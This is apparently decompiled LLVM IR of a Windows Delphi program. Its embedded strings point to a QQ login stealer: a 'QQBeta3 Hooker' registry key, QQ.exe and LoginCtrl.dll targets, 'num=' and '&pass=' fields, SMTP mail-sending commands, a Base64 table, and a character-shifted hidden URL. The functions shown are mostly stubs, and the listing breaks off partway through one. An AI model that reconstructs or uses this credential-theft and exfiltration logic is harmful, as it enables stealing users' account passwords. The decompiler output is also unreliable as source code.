source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_404c24 = local_unnamed_addr constant i32 43
@global_var_404c3c = constant i32 37
@global_var_404cc4 = local_unnamed_addr constant i32 63
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_404fe8 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404fec = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_405008 = constant [10 x i8] c"First Run\00"
@global_var_4050c4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4050e0 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_40518c = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_40519c = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4080fc = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 0
@global_var_4052e0 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_405304 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_405398 = constant [11 x i8] c"user32.dll\00"
@global_var_4053a4 = constant [11 x i8] c"LoadImageA\00"
@global_var_4053b0 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_404d40 = local_unnamed_addr constant i32 4214156
@global_var_404d8c = local_unnamed_addr constant i32 1867011080
@global_var_4053c0 = constant [12 x i8] c"LoadStringA\00"
@global_var_4053cc = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_4053d8 = constant [12 x i8] c"shell32.dll\00"
@global_var_4053e4 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_4053f4 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_4080fd = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_4056d4 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_408108 = local_unnamed_addr global i32 4216868
@B64EncodeTable_at_405824 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405efc = constant [6 x i8] c"HELO \00"
@global_var_405f0c = constant [3 x i8] c"\0D\0A\00"
@global_var_405f18 = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405f30 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405f48 = constant i32 62
@global_var_405f54 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405f68 = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405f78 = constant [8 x i8] c"From: <\00"
@global_var_405f88 = constant [6 x i8] c"To: <\00"
@global_var_405f98 = constant [10 x i8] c"Subject: \00"
@global_var_405fac = constant i32 46
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_405fb8 = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_406002 = local_unnamed_addr constant i32 763609949
@global_var_406124 = constant [7 x i8] c"#32770\00"
@global_var_406134 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4061d8 = local_unnamed_addr constant i32 4219356
@global_var_4061dc = local_unnamed_addr constant i32 841875985
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 4219648
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_4064fc = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406814 = constant [6 x i8] c"Down(\00"
@global_var_406824 = constant i32 41
@global_var_406830 = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406834 = constant [5 x i8] c"Open\00"
@global_var_4096d8 = global i32 0
@global_var_406af8 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406b04 = constant i32 47
@global_var_406b44 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406b50 = constant [5 x i8] c"num=\00"
@global_var_406b60 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_406b70 = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406c48 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406c58 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406d68 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406d78 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406d80 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406ff4 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_407008 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_407014 = local_unnamed_addr constant i32 47
@global_var_406e00 = local_unnamed_addr constant i32 4222468
@global_var_406e04 = local_unnamed_addr constant i32 841875985
@global_var_407134 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_407148 = constant i32 47
@global_var_407154 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_40772c = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4077d8 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_407960 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_40796c = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d8
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_407a60 = local_unnamed_addr constant i32 27
@global_var_4097f8 = local_unnamed_addr global i32 0
@global_var_4097fc = local_unnamed_addr global i32 0
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407df8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_4097f4 = local_unnamed_addr global i32 0
@global_var_407e08 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e20 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e38 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e48 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e58 = constant [8 x i8] c"ListBox\00"
@global_var_409804 = global i32 0
@global_var_407e68 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096ec = external global i8*

declare i32 @unknown_5068() local_unnamed_addr

declare i32 @unknown_5140() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
